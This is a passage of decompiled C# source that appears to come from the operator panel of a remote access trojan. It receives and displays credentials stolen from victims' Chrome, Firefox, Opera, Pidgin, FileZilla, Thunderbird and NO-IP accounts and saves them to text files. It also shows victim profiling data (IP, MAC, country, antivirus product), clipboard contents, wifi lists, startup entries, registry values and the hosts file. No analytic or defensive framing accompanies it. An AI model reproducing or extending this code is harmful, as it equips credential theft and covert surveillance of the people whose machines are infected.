						if (passwordsGR2.CountGroupsChrome == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "Google Chrome");
						}
						PasswordsGR passwordsGR3 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR3;
						passwordsGR4.CountGroupsChrome++;
						ListViewItem val27 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { SocketServer.Decode(array[1]) }, 4, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						val27.get_SubItems().Add(SocketServer.Decode(array[2]));
						val27.get_SubItems().Add(SocketServer.Decode(array[3]));
					}
					if (Operators.CompareString(array[4], "Firefox", false) == 0)
					{
						if (passwordsGR2.CountGroupFireFox == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "Mozilla Firefox");
						}
						PasswordsGR passwordsGR5 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR5;
						passwordsGR4.CountGroupFireFox++;
						ListViewItem val28 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { SocketServer.Decode(array[1]) }, 5, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						val28.get_SubItems().Add(SocketServer.Decode(array[2]));
						val28.get_SubItems().Add(SocketServer.Decode(array[3]));
					}
					if (Operators.CompareString(array[4], "Opera", false) == 0)
					{
						if (passwordsGR2.CountGroupsOpera == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "Opera Browser");
						}
						PasswordsGR passwordsGR6 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR6;
						passwordsGR4.CountGroupsOpera++;
						ListViewItem val29 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { SocketServer.Decode(array[1]) }, 3, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						val29.get_SubItems().Add(SocketServer.Decode(array[2]));
						val29.get_SubItems().Add(SocketServer.Decode(array[3]));
					}
					if (Operators.CompareString(array[4], "Pidgin", false) == 0)
					{
						if (passwordsGR2.CountGroupPidgin == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "Pidgin IM");
						}
						PasswordsGR passwordsGR7 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR7;
						passwordsGR4.CountGroupPidgin++;
						ListViewItem val30 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { SocketServer.Decode(array[1]) }, 0, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						val30.get_SubItems().Add(SocketServer.Decode(array[2]));
						val30.get_SubItems().Add(SocketServer.Decode(array[3]));
					}
					if (Operators.CompareString(array[4], "FileZilla", false) == 0)
					{
						if (passwordsGR2.CountGroupFileZilla == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "FileZilla");
						}
						PasswordsGR passwordsGR8 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR8;
						passwordsGR4.CountGroupFileZilla++;
						ListViewItem val31 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { SocketServer.Decode(array[1]) }, 2, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						val31.get_SubItems().Add(SocketServer.Decode(array[2]));
						val31.get_SubItems().Add(SocketServer.Decode(array[3]));
					}
					if (Operators.CompareString(array[4], "Mozilla Thunderbird", false) == 0)
					{
						if (passwordsGR2.CountGroupFireFox == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "Mozilla Thunderbird");
						}
						PasswordsGR passwordsGR9 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR9;
						passwordsGR4.CountGroupFireFox++;
						ListViewItem val32 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { SocketServer.Decode(array[1]) }, 5, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						val32.get_SubItems().Add(SocketServer.Decode(array[2]));
						val32.get_SubItems().Add(SocketServer.Decode(array[3]));
					}
					if (Operators.CompareString(array[4], "NO-IP", false) == 0)
					{
						if (passwordsGR2.CountGroupNO_IP == 0)
						{
							passwordsGR2.ListView1.get_Groups().Add("", "NO-IP");
						}
						PasswordsGR passwordsGR10 = passwordsGR2;
						PasswordsGR passwordsGR4 = passwordsGR10;
						passwordsGR4.CountGroupNO_IP++;
						byte[] bytes4 = Convert.FromBase64String(SocketServer.Decode(array[2]));
						string @string = Encoding.ASCII.GetString(bytes4);
						ListViewItem val33 = passwordsGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "NO-IP" }, 1, passwordsGR2.ListView1.get_Groups().get_Item(passwordsGR2.ListView1.get_Groups().get_Count() - 1)));
						passwordsGR2.ListView1.get_Items().Add(SocketServer.Decode(array[1]));
						val33.get_SubItems().Add(@string);
					}
				}
				else if (Operators.CompareString(array[0], "PasswordsResult", false) == 0)
				{
					PasswordsGR passwordsGR11 = (PasswordsGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Passwords" + array[2]);
					((ToolStripItem)passwordsGR11.ToolStripStatusLabel1).set_Text(array[1]);
					((ToolStripItem)passwordsGR11.ToolStripStatusLabel2).set_Text(" -   Passwords: " + passwordsGR11.ListView1.get_Items().get_Count());
					if (passwordsGR11.ListView1.get_Items().get_Count() <= 0)
					{
						return;
					}
					try
					{
						IEnumerator enumerator3 = default(IEnumerator);
						try
						{
							enumerator3 = passwordsGR11.ListView1.get_Items().GetEnumerator();
							while (enumerator3.MoveNext())
							{
								ListViewItem val34 = (ListViewItem)enumerator3.Current;
								((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(passwordsGR11.Path + passwordsGR11.T + "-" + passwordsGR11.TH + ".txt", "URL : " + val34.get_SubItems().get_Item(0).get_Text() + "\r\nUser : " + val34.get_SubItems().get_Item(1).get_Text() + "\r\nPass  : " + val34.get_SubItems().get_Item(2).get_Text() + "\r\n", true);
							}
						}
						finally
						{
							if (enumerator3 is IDisposable)
							{
								(enumerator3 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "System Information", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]) != null)
					{
						s.Send(int.Parse(array[2]), "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data11 = this.data;
						((Control)this).Invoke((Delegate)data11, new object[2] { sock, b });
					}
					else
					{
						SystemInfGR systemInfGR = new SystemInfGR();
						systemInfGR.sock = sock;
						((Control)systemInfGR).set_Name("System Information" + array[2]);
						((Form)systemInfGR).set_Text("[ System Information ][ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
						((ToolStripItem)systemInfGR.ToolStripStatusLabel1).set_Text("Ready to any command!");
						((Control)systemInfGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "System Details", false) == 0)
				{
					SystemInfGR systemInfGR2 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
					if (Operators.CompareString(array[1], "Done!", false) == 0)
					{
						((Control)systemInfGR2.clearpcinf).set_Enabled(true);
						((Control)systemInfGR2.ListView1).set_Enabled(true);
						((ToolStripItem)systemInfGR2.ToolStripStatusLabel1).set_Text("List of information successfully created");
					}
					else
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data12 = this.data;
							((Control)this).Invoke((Delegate)data12, new object[2] { sock, b });
							return;
						}
						string[] array6 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "Machine-Information", -1, (CompareMethod)0);
						systemInfGR2.ListView1.get_Groups().Add(new ListViewGroup("Client Information :"));
						systemInfGR2.ListView1.get_Groups().Add(new ListViewGroup("Network Information :"));
						systemInfGR2.ListView1.get_Groups().Add(new ListViewGroup("Computer Specifications :"));
						systemInfGR2.ListView1.get_Groups().Add(new ListViewGroup("System Specifications :"));
						systemInfGR2.ListView1.get_Groups().Add(new ListViewGroup("BIOS Specifications :"));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Client Location : " + array6[0] }, 0));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Client Identifier : " + SocketServer.Decode(array6[1]) }, 1));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Client Country : " + GeoIP.LookupCountryName(s.IP(ref sock)) }, 2));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "WAN : " + s.IP(ref sock) }, 3));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "LAN : " + array6[2] }, 4));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "MAC Address : " + array6[3] }, 5));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Operating System : " + array6[4] }, 6));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Computer Name : " + array6[5] }, 7));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Computer Username : " + array6[6] }, 8));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Start Up Time : " + array6[7] }, 9));
						int num15 = (array6[27].ToString().Contains("AVG") ? 24 : (array6[27].ToString().Contains("Avira") ? 27 : (array6[27].ToString().Contains("Bitdefender") ? 28 : (array6[27].ToString().Contains("ESET") ? 22 : (array6[27].ToString().Contains("Kaspersky") ? 23 : (array6[27].ToString().Contains("McAfee") ? 26 : ((!array6[27].ToString().Contains("Avast")) ? 10 : 25)))))));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Antivirus : " + array6[27] }, num15));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Active Window : " + array6[8] }, 11));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Screen Resolution " + array6[9] }, 12));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Screens : " + array6[10] }, 13));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "N* Mouse Buttons : " + array6[11] }, 14));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Mouse Speed : " + array6[12] }, 14));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Keyboard Language : " + array6[13] }, 15));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Keyboard Speed : " + array6[14] }, 15));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Graphics Card : " + array6[17] }, 16));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Ram : " + SocketServer.GetSize(ulong.Parse(array6[18])) }, 17));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Free Ram : " + array6[19] }, 17));
						int num16 = ((Operators.CompareString(array6[20], "High, Charging", false) == 0) ? 21 : ((Operators.CompareString(array6[20], "Medium, Charging", false) == 0) ? 30 : ((Operators.CompareString(array6[20], "Low, Charging", false) == 0) ? 32 : ((Operators.CompareString(array6[20], "High", false) == 0) ? 29 : ((Operators.CompareString(array6[20], "Low", false) == 0) ? 33 : ((Operators.CompareString(array6[20], "Medium", false) != 0) ? 18 : 31))))));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Battery : " + array6[20] }, num16));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Architecture : " + array6[22] }, 19));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Platform : " + array6[23] }, 19));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Version : " + array6[24] }, 19));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Boot Mode : " + array6[25] }, 19));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "Freamwork Version : " + array6[26] }, 19));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "BIOS Name : " + array6[15] }, 20));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "BIOS Speed : " + array6[16] + " Mhz" }, 20));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "BIOS Version : " + array6[28] }, 20));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "BIOS Manufacturers : " + array6[29] }, 20));
						systemInfGR2.ListView1.get_Items().Add(new ListViewItem(new string[1] { "BIOS Release date : " + array6[30] }, 20));
						systemInfGR2.ListView1.get_Items().get_Item(0).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(0));
						systemInfGR2.ListView1.get_Items().get_Item(1).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(0));
						systemInfGR2.ListView1.get_Items().get_Item(2).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(0));
						systemInfGR2.ListView1.get_Items().get_Item(3).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(1));
						systemInfGR2.ListView1.get_Items().get_Item(4).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(1));
						systemInfGR2.ListView1.get_Items().get_Item(5).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(1));
						systemInfGR2.ListView1.get_Items().get_Item(6).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(7).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(8).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(9).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(10).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(11).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(12).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(13).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(14).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(15).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(16).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(17).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(18).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(19).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(20).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(21).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(2));
						systemInfGR2.ListView1.get_Items().get_Item(22).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(3));
						systemInfGR2.ListView1.get_Items().get_Item(23).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(3));
						systemInfGR2.ListView1.get_Items().get_Item(24).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(3));
						systemInfGR2.ListView1.get_Items().get_Item(25).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(3));
						systemInfGR2.ListView1.get_Items().get_Item(26).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(3));
						systemInfGR2.ListView1.get_Items().get_Item(27).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(4));
						systemInfGR2.ListView1.get_Items().get_Item(28).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(4));
						systemInfGR2.ListView1.get_Items().get_Item(29).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(4));
						systemInfGR2.ListView1.get_Items().get_Item(30).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(4));
						systemInfGR2.ListView1.get_Items().get_Item(31).set_Group(systemInfGR2.ListView1.get_Groups().get_Item(4));
					}
				}
				else if (Operators.CompareString(array[0], "GetStartupFiles", false) == 0)
				{
					SystemInfGR systemInfGR3 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
					string[] array7 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "|-", -1, (CompareMethod)0);
					int num17 = array7.Length - 2;
					int num18 = 0;
					while (true)
					{
						int num19 = num18;
						int num5 = num17;
						if (num19 > num5)
						{
							break;
						}
						systemInfGR3.ListView5.get_Items().Add(array7[num18], 1);
						num18++;
						num18 += 0;
					}
					((Control)systemInfGR3.ListView5).set_Enabled(true);
					((ToolStripItem)systemInfGR3.ToolStripStatusLabel8).set_Text("List of files successfully created");
				}
				else if (Operators.CompareString(array[0], "RemoveFromSList", false) == 0)
				{
					SystemInfGR systemInfGR4 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[3]);
					if (Operators.CompareString(SocketServer.Decode(array[2]), "R", false) == 0)
					{
						try
						{
							IEnumerator enumerator4 = default(IEnumerator);
							try
							{
								enumerator4 = systemInfGR4.ListView5.get_Items().GetEnumerator();
								while (enumerator4.MoveNext())
								{
									ListViewItem val35 = (ListViewItem)enumerator4.Current;
									if (Operators.CompareString(val35.get_SubItems().get_Item(0).get_Text(), SocketServer.Decode(array[1]), false) == 0)
									{
										((ToolStripItem)systemInfGR4.ToolStripStatusLabel8).set_Text("File has been successfully deleted : " + SocketServer.Decode(array[1]));
										val35.Remove();
									}
								}
							}
							finally
							{
								if (enumerator4 is IDisposable)
								{
									(enumerator4 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError16)
						{
							ProjectData.SetProjectError(projectError16);
							ProjectData.ClearProjectError();
						}
					}
					((ToolStripItem)systemInfGR4.ToolStripStatusLabel8).set_Text("Could not delete this file : " + SocketServer.Decode(array[1]));
				}
				else if (Operators.CompareString(array[0], "GSV", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data13 = this.data;
						((Control)this).Invoke((Delegate)data13, new object[2] { sock, b });
					}
					else
					{
						SystemInfGR systemInfGR5 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
						string[] array8 = Strings.Split(SocketServer.Decode(array[1]), "|", -1, (CompareMethod)0);
						int num20 = array8.Length - 2;
						int num21 = 0;
						while (true)
						{
							int num22 = num21;
							int num5 = num20;
							if (num22 > num5)
							{
								break;
							}
							systemInfGR5.ListView4.get_Items().Add(array8[num21], 0).get_SubItems()
								.Add(array8[num21 + 1]);
							num21++;
							num21++;
							num21 += 0;
						}
						systemInfGR5.ListView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
						((Control)systemInfGR5.ListView4).set_Enabled(true);
						((ToolStripItem)systemInfGR5.ToolStripStatusLabel7).set_Text("List of values successfully created");
					}
				}
				else if (Operators.CompareString(array[0], "DeleteReg", false) == 0)
				{
					SystemInfGR systemInfGR6 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[3]);
					if (Operators.CompareString(array[2], "R", false) == 0)
					{
						try
						{
							IEnumerator enumerator5 = default(IEnumerator);
							try
							{
								enumerator5 = systemInfGR6.ListView4.get_Items().GetEnumerator();
								while (enumerator5.MoveNext())
								{
									ListViewItem val36 = (ListViewItem)enumerator5.Current;
									if (Operators.CompareString(val36.get_SubItems().get_Item(0).get_Text(), SocketServer.Decode(array[1]), false) == 0)
									{
										((ToolStripItem)systemInfGR6.ToolStripStatusLabel7).set_Text("Value has been successfully deleted : " + SocketServer.Decode(array[1]));
										val36.Remove();
									}
								}
							}
							finally
							{
								if (enumerator5 is IDisposable)
								{
									(enumerator5 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError17)
						{
							ProjectData.SetProjectError(projectError17);
							ProjectData.ClearProjectError();
						}
					}
					if (Operators.CompareString(array[2], "F", false) == 0)
					{
						((ToolStripItem)systemInfGR6.ToolStripStatusLabel7).set_Text("Could not delete this Value : " + SocketServer.Decode(array[1]));
					}
				}
				else if (Operators.CompareString(array[0], "GWL", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data14 = this.data;
						((Control)this).Invoke((Delegate)data14, new object[2] { sock, b });
						return;
					}
					SystemInfGR systemInfGR7 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[1]);
					string[] array9 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[2])), "|WI|", -1, (CompareMethod)0);
					try
					{
						int num23 = array9.Length - 2;
						int num24 = 0;
						while (true)
						{
							int num25 = num24;
							int num5 = num23;
							if (num25 <= num5)
							{
								ListViewItem val37 = systemInfGR7.WIL.get_Items().Add(" " + array9[num24], SocketServer.GWS(int.Parse(array9[num24 + 1])));
								val37.get_SubItems().Add(array9[num24 + 1] + " %");
								val37.get_SubItems().Add(array9[num24 + 2]);
								num24 += 2;
								num24++;
								num24 += 0;
								continue;
							}
							break;
						}
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
					}
					try
					{
						systemInfGR7.WIL.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "WLS", false) == 0)
				{
					SystemInfGR systemInfGR8 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
					if (Operators.CompareString(array[1], "Done", false) == 0)
					{
						((Control)systemInfGR8.WIL).set_Enabled(true);
						((ToolStripItem)systemInfGR8.ToolStripStatusLabel2).set_Text("List of wifi list successfully created");
					}
					else if (Operators.CompareString(array[1], "Could not retrieve Wifi list", false) == 0)
					{
						((Control)systemInfGR8.WIL).set_Enabled(true);
						((ToolStripItem)systemInfGR8.ToolStripStatusLabel2).set_Text("Could not retrieve Wifi list");
					}
					else
					{
						((ToolStripItem)systemInfGR8.ToolStripStatusLabel2).set_Text(array[1]);
					}
				}
				else if (Operators.CompareString(array[0], "GetClipboard", false) == 0)
				{
					SystemInfGR systemInfGR9 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[3]);
					systemInfGR9.Textc.set_Text("");
					systemInfGR9.Textc.set_Text(SocketServer.Decode(array[1]).ToString());
					((ToolStripItem)systemInfGR9.ToolStripStatusLabel5).set_Text(array[2]);
				}
				else if (Operators.CompareString(array[0], "Clipboard Result", false) == 0)
				{
					SystemInfGR systemInfGR10 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[3]);
					((ToolStripItem)systemInfGR10.ToolStripStatusLabel5).set_Text(SocketServer.Decode(array[1] + array[2]));
				}
				else if (Operators.CompareString(array[0], "Clipboard C", false) == 0)
				{
					SystemInfGR systemInfGR11 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[3]);
					((ToolStripItem)systemInfGR11.ToolStripStatusLabel5).set_Text(array[1]);
				}
				else if (Operators.CompareString(array[0], "Getinstalledprograms", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data15 = this.data;
						((Control)this).Invoke((Delegate)data15, new object[2] { sock, b });
					}
					SystemInfGR systemInfGR12 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
					string[] array10 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "ProgramsPlugin", -1, (CompareMethod)0);
					if (Operators.CompareString(array[1], "Done", false) == 0)
					{
						((Control)systemInfGR12.ListView2).set_Enabled(true);
						((ToolStripItem)systemInfGR12.ToolStripStatusLabel3).set_Text("List of installed programs successfully created , Number of programs : [ " + systemInfGR12.ListView2.get_Items().get_Count() + " ]");
					}
					try
					{
						int num26 = array10.Length - 1;
						int num27 = 0;
						while (true)
						{
							int num28 = num27;
							int num5 = num26;
							if (num28 <= num5 && ((num27 <= array10.Length - 1 && ((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]) != null) || 1 == 0))
							{
								ListViewItem val38 = systemInfGR12.ListView2.FindItemWithText(array10[num27 + 0]);
								if (val38 == null)
								{
									ListViewItem val39 = systemInfGR12.ListView2.get_Items().Add(array10[num27 + 0], 0);
									val39.get_SubItems().Add(array10[num27 + 1]);
									val39.get_SubItems().Add(array10[num27 + 4]);
									val39.get_SubItems().Add(array10[num27 + 3]);
									val39.get_SubItems().Add(array10[num27 + 2]);
								}
								num27 += 4;
								num27++;
								num27 += 0;
								continue;
							}
							break;
						}
					}
					catch (Exception projectError20)
					{
						ProjectData.SetProjectError(projectError20);
						ProjectData.ClearProjectError();
					}
					try
					{
						systemInfGR12.ListView2.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
					}
					catch (Exception projectError21)
					{
						ProjectData.SetProjectError(projectError21);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "GAVN", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data16 = this.data;
						((Control)this).Invoke((Delegate)data16, new object[2] { sock, b });
					}
					else
					{
						SystemInfGR systemInfGR13 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
						if (Operators.CompareString(array[1], "ERR", false) == 0)
						{
							((ToolStripItem)systemInfGR13.ToolStripStatusLabel4).set_Text("Error : Couldn't get %% List!".Replace("%%", array[3]));
							((Control)systemInfGR13.AVRE).set_Enabled(true);
						}
						else
						{
							((Control)systemInfGR13.AVLIST).set_Enabled(false);
							((Control)systemInfGR13.CAVLIST).set_Enabled(true);
							string[] array11 = Strings.Split(Conversions.ToString(STRCOMP.Decode(array[1])), "|", -1, (CompareMethod)0);
							int num29 = array11.Length - 2;
							int num30 = 0;
							while (true)
							{
								int num31 = num30;
								int num5 = num29;
								if (num31 > num5)
								{
									break;
								}
								if (array11[num30].Contains("Display Name"))
								{
									systemInfGR13.AVLIST.get_Groups().Add("", array11[num30].Replace("!+_+!Display Name", "") + " :");
									string[] array12 = Strings.Split(array11[num30], "!+_+!", -1, (CompareMethod)0);
									systemInfGR13.AVLIST.get_Items().Add(new ListViewItem(new string[2]
									{
										array12[1] + " : ",
										array12[0]
									}, 0, systemInfGR13.AVLIST.get_Groups().get_Item(systemInfGR13.AVLIST.get_Groups().get_Count() - 1)));
									systemInfGR13.AVLIST.get_Items().Add(new ListViewItem(new string[2]
									{
										"Type : ",
										array[3]
									}, 0, systemInfGR13.AVLIST.get_Groups().get_Item(systemInfGR13.AVLIST.get_Groups().get_Count() - 1)));
								}
								else
								{
									string[] array13 = Strings.Split(array11[num30], "!+_+!", -1, (CompareMethod)0);
									systemInfGR13.AVLIST.get_Items().Add(new ListViewItem(new string[2]
									{
										array13[1] + " : ",
										array13[0]
									}, 0, systemInfGR13.AVLIST.get_Groups().get_Item(systemInfGR13.AVLIST.get_Groups().get_Count() - 1)));
								}
								num30++;
								num30 += 0;
							}
							((Control)systemInfGR13.CAVLIST).set_Enabled(true);
							((Control)systemInfGR13.AVLIST).set_Enabled(true);
							((ToolStripItem)systemInfGR13.ToolStripStatusLabel4).set_Text("List of %% information successfully created".Replace("%%", array[3]));
							systemInfGR13.AVLIST.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
						}
					}
				}
				else if (Operators.CompareString(array[0], "ReadHostsFile", false) == 0)
				{
					SystemInfGR systemInfGR14 = (SystemInfGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + array[2]);
					systemInfGR14.HostsText.set_Text(Conversions.ToString(STRCOMP.Decode(array[1])));
					((Control)systemInfGR14.HostsText).set_Enabled(true);
					((ToolStripItem)systemInfGR14.ToolStripStatusLabel6).set_Text("Hosts File successfully created");
				}
				else if (Operators.CompareString(array[0], "TS", false) == 0)
				{
					TSDGR tSDGR = (TSDGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF");
					string[] array14 = Strings.Split(array[2], "|", -1, (CompareMethod)0);
					try
					{
						IEnumerator enumerator6 = default(IEnumerator);
						try
						{
							enumerator6 = tSDGR.Clients.get_Items().GetEnumerator();
							while (enumerator6.MoveNext())
							{
								ListViewItem val40 = (ListViewItem)enumerator6.Current;
								if (Operators.CompareString(val40.get_SubItems().get_Item(0).get_Text(), SocketServer.Decode(array[1]) + " / " + s.IP(ref sock), false) == 0)
								{
									return;
								}
							}
						}
						finally
						{
							if (enumerator6 is IDisposable)
							{
								(enumerator6 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError22)
					{
						ProjectData.SetProjectError(projectError22);
						ProjectData.ClearProjectError();
					}
					ListViewItem val41;
					if ((Operators.CompareString(array14[0], "True", false) == 0) & (Operators.CompareString(array14[1], "True", false) == 0))
					{
						val41 = tSDGR.Clients.get_Items().Add(SocketServer.Decode(array[1]) + " / " + s.IP(ref sock), 0);
